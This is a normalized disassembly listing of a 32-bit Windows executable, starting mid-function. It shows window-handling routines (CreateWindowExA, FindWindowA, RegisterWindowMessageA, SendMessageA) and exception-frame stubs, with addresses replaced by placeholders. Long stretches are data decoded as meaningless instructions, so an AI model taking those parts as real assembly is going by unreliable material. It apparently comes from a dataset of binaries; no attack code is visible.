mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402914
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406c68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406d5d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406d85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d8c
retn
sub_406d98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406dbd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406dc4
retn
sub_406dd0
salc
dec eax
add al dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ eax + 0x640000ff ] dh
salc
dec eax
add [ ecx + 0x640000ff ] dh
salc
dec eax
add [ edx + 0x640000ff ] dh
salc
dec eax
add [ ebx + 0x640000ff ] dh
salc
dec eax
add [ edi + edi * 8 - 0x299c0000 ] dh
dec eax
add [ ebp + 0x640000ff ] dh
salc
dec eax
add [ esi + 0x640000ff ] dh
salc
dec eax
add [ edi + 0x640000ff ] dh
salc
dec eax
add [ eax + 0x640000ff ] bh
salc
dec eax
add [ ecx + 0x640000ff ] bh
salc
dec eax
add [ edx + 0x640000ff ] bh
salc
dec eax
add [ ebx + 0x640000ff ] bh
salc
dec eax
add [ edi + edi * 8 - 0x299c0000 ] bh
dec eax
add [ ebp + 0x640000ff ] bh
salc
dec eax
add [ esi + 0x640000ff ] bh
salc
dec eax
add [ edi + 0x640000ff ] bh
salc
dec eax
add [ eax + 0x640000ff ] ah
salc
dec eax
add [ ecx + 0x640000ff ] ah
salc
dec eax
add [ edx + 0x640000ff ] ah
salc
dec eax
add [ ebx + 0x640000ff ] ah
salc
dec eax
add [ edi + edi * 8 - 0x299c0000 ] ah
dec eax
add [ ebp + 0x640000ff ] ah
salc
dec eax
add [ esi + 0x640000ff ] ah
salc
dec eax
add [ edi + 0x640000ff ] ah
salc
dec eax
add [ eax + 0x640000ff ] ch
salc
dec eax
add [ ecx + 0x640000ff ] ch
salc
dec eax
add [ edx + 0x640000ff ] ch
salc
dec eax
add [ ebx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_4070d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4070dc
retn
sub_4070e8
in al dx
jo r-xdata
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ edx ] cl
or [ esi + eax * 2 + 0x69 ] edx
insb
dec esi
popad
insd
nop
inc esp
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x100040 ] ch
add [ eax ] al
clc
jo r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x71 ] dl
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
outsd
outsb
lodsb [ esi ]
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x71 ] ah
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jb r-xdata
inc eax
add al al
xor [ eax ] al
mov [ ecx + 0x31180040 ] bh
inc eax
add [ esi ] cl
inc ebp
dec eax
popad
jo r-xdata
add [ eax + 0x180040b9 ] cl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x40 ] ah
inc eax
add al al
xor [ eax ] al
mov [ ecx + 0x31180040 ] bh
inc eax
add [ eax * 2 + 0x4f74754f ] cl
dec bp
insd
outsd
jb r-xdata
js r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x100040 ] bh
add [ eax ] al
clc
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax [ ebp + 0x49 ]
jo r-xdata
add [ eax ] al
mov esp 0x10004072
add [ eax ] al
add al bh
lea eax [ eax ]
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x40 ] dh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al [ ebp + 0x45 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 ] dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x45 ] eax
add [ eax ] al
inc ebp
jb r-xdata
outsb
dec edi
jne r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ebx ] cl
inc ebp
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
imul ebp [ edi + 0x6e ] 0x40720890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
jae r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x49 ] eax
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] dh
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x73
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al bh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] ch
jae r-xdata
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x44 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
popad
insb
mov eax eax
adc al 0x73
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] ch
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x74
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
and al 0x74
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax [ eax ]
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edx ] cl
inc ebp
inc esp
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] dh
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
js r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx ] cl
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] bh
add [ eax ] dl
add [ eax ] al
add [ eax ] ch
jae r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 ] ah
inc eax
js r-xdata
inc eax
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edx ] dl
inc ebp
inc ebp
ror ah 0x73
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
imul ebp [ edi + 0x6e ] 0x40737490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
inc eax
add al al
xor [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ eax + eax * 2 ]
adc [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x33700040 ] cl
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jne r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x4d ]
popad
je r-xdata
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edx ] cl
inc ebp
dec ebp
jbe r-xdata
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x49 ]
outsb
jbe r-xdata
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jne r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax [ ebp + 0x5a ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004075 ] cl
inc eax
add al al
xor [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x33700040 ] cl
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebp + 0x40 ] dh
add [ eax ] dl
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40758890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ eax * 2 + 0x4f746e49 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x33700040 ] cl
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
imul esi [ esi + 0x69 ] 0x75e06564
inc eax
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ebp + 0x40 ] dh
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x33700040 ] cl
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
jbe r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x4f ] eax
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al 0x45
dec ecx
outsb
je r-xdata
xor [ ebp + 0x40 ] dh
add [ eax ] al
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax [ ebp + 0x52 ]
popad
outsb
inc ebp
jb r-xdata
inc eax
add al bl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc eax
add al al
xor [ eax ] al
mov [ ecx + 0x31180040 ] bh
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004076 ] dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x55 ]
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jbe r-xdata
jb r-xdata
add ah bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
clc
jo r-xdata
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x71 ] ah
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] dl
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x100040 ] ah
add [ eax ] al
jo r-xdata
lea eax [ eax ]
dec eax
ja r-xdata
jbe r-xdata
xor [ eax ] eax
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
jbe r-xdata
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx ] cl
inc ebp
dec edi
nop
jbe r-xdata
inc eax
add [ eax + 0x33 ] bh
sar [ eax ] 0x76
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax 0x6e6f4345
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] cl
inc eax
add [ eax + eax ] cl
add [ eax ] al
clc
jo r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al 0x45
dec ecx
outsb
jbe r-xdata
jbe r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ 0x6e6f4345 ] cl
add [ eax ] al
add [ eax ] al
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ eax * 2 + 0x61766e49 ] cl
add [ eax ] al
add [ eax ] al
add [ eax + 0x180040b9 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x40 ] bl
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] dh
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc [ ebp + 0x41 ] al
arpl [ ebx + 0x65 ] sp
jae r-xdata
outsb
lea eax [ eax ]
add al 0x78
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
jb r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ eax + 0x77 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004078 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax + 0x72 ] dh
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] dh
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jns r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x43 ] eax
outsd
outsb
je r-xdata
mov eax eax
adc [ ecx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x10004078
insb
nop
pop esp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x78
outsd
inc eax
shl [ edi + esi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
clc
jo r-xdata
add [ eax ] al
add [ eax ] al
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebp
push ebx
je r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
